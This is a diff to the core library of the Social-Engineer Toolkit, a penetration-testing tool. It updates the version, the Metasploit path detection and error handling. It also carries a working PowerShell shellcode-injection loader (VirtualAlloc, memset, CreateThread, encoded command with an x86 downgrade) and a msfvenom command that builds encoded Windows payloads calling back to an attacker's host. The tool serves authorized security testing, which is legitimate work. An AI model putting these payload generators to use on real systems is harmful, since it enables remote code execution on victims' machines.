@@ -233,7 +233,7 @@ def print_error(message):
     print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC
 
 def get_version():
-    define_version = '6.4.1'
+    define_version = '6.5.8'
     return define_version
 
 class create_menu:
@@ -276,13 +276,11 @@ def validate_ip(address):
 # grab the metaspoit path
 #
 def meta_path():
-    # DEFINE METASPLOIT PATH
-    msf_path = check_config("METASPLOIT_PATH=")
-    if msf_path.endswith("/"): pass
-    else: msf_path = msf_path + "/"
-    trigger = 0
-    if not os.path.isdir(msf_path):
 
+    # DEFINE METASPLOIT PATH
+    trigger = 0
+    try:
+    
                 # specific for backbox linux
                 if os.path.isfile("/opt/metasploit-framework/msfconsole"):
                     msf_path = "/opt/metasploit-framework/"
@@ -290,7 +288,8 @@ def meta_path():
 
                 # specific for kali linux
                 if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
-                    msf_path = "/opt/metasploit/apps/pro/msf3/"
+		    # left blank since you can call launcher and ruby1.9 - 2x issues are there
+                    msf_path = ""
                     trigger = 1
 
                 # specific for backtrack5 and other backtrack versions
@@ -309,23 +308,35 @@ def meta_path():
                     msf_path = "/opt/metasploit-framework/"
                     trigger = 1
 
+		# specific for pentesters framework github.com/trustedsec/ptf
+		if os.path.isfile("/pentest/exploitation/metasploit/msfconsole"):
+			msf_path = "/pentest/exploitation/metasploit/"
+			trigger = 1
+
 		if os.path.isfile("/usr/bin/msfconsole"):
 			msf_path = ""
 			trigger = 1
 
-                if trigger == 0:
-                    if check_os() != "windows":
-                        check_metasploit = check_config("METASPLOIT_MODE=").lower()
-                        if check_metasploit != "off":
-                            print_error("Metasploit path not found. These payloads will be disabled.")
-                            print_error("Please configure in the /etc/setoolkit/set.config.")
-                            return_continue()
-                            return False
+                # if we are using windows
+                if check_os() == "windows":
+                   print_warning("Metasploit payloads are not currently supported. This is coming soon.")
+                   msf_path = False
 
-                    # if we are using windows
-                    if check_os() == "windows":
-                        print_warning("Metasploit payloads are not currently supported. This is coming soon.")
-                        msf_path = ""
+
+    except Exception, e:
+	print_status("Something went wrong. Printing error: " + str(e))
+
+    # if all else fails then pull config path
+    if trigger == 0:
+	    msf_path = check_config("METASPLOIT_PATH=")
+	    if msf_path.endswith("/"): pass
+	    
+	    else: msf_path = msf_path + "/"
+
+	    if not os.path.isfile(msf_path + "/msfconsole"): 
+		print_error("Metasploit path not found. These payloads will be disabled.")
+		print_error("Please configure Metasploit's path in the /etc/setoolkit/set.config file.")
+		msf_path = False		
 
     # this is an option if we don't want to use Metasploit period
     check_metasploit = check_config("METASPLOIT_MODE=").lower()
@@ -711,20 +722,22 @@ def windows_root():
 # core log file routine for SET
 #
 def log(error):
+    try:
         # open log file only if directory is present (may be out of directory for some reason)
-    if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
-        filewrite = file("%s/src/logs/set_logfile.log" % (definepath()), "w")
-        filewrite.write("")
-        filewrite.close()
-    if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
-        error = str(error)
-        # open file for writing
-        filewrite = file("%s/src/logs/set_logfile.log" % (definepath()), "a")
-        # write error message out
-        filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
-        # close the file
-        filewrite.close()
-
+        if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
+            filewrite = file("%s/src/logs/set_logfile.log" % (definepath()), "w")
+            filewrite.write("")
+            filewrite.close()
+        if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
+            error = str(error)
+            # open file for writing
+            filewrite = file("%s/src/logs/set_logfile.log" % (definepath()), "a")
+            # write error message out
+            filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
+            # close the file
+            filewrite.close()
+    except IOError as err:
+        pass
 #
 # upx encoding and modify binary
 #
@@ -780,7 +793,7 @@ def show_banner(define_version,graphic):
 [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
 [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
 [---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                   [---]
-[---]           Codename: '""" + bcolors.YELLOW + """Tropic Thunder""" + bcolors.BLUE + """'             [---]
+[---]               Codename: '""" + bcolors.YELLOW + """Mr. Robot""" + bcolors.BLUE + """'              [---]
 [---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@TrustedSec""" + bcolors.BLUE+"""         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@HackingDave""" + bcolors.BLUE+"""        [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]
@@ -1261,8 +1274,6 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
         shellcode = newdata[:-1]
     except Exception, e: print_error("Something went wrong, printing error: " + str(e))
     # powershell command here, needs to be unicoded then base64 in order to use encodedcommand - this incorporates a new process downgrade attack where if it detects 64 bit it'll use x86 powershell. This is useful so we don't have to guess if its x64 or x86 and what type of shellcode to use
-    # powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$cmd = "-nop -noni -enc ";if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $x86 $cmd $e"}else{;iex "& powershell $cmd $e";}""" %  (shellcode))
-
     powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (shellcode))
 
     # unicode and base64 encode and return it
@@ -1274,7 +1285,7 @@ def generate_shellcode(payload,ipaddr,port):
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows -f c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
     repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'unsigned char buf=' : '', 'unsignedcharbuf[]=' : ''}
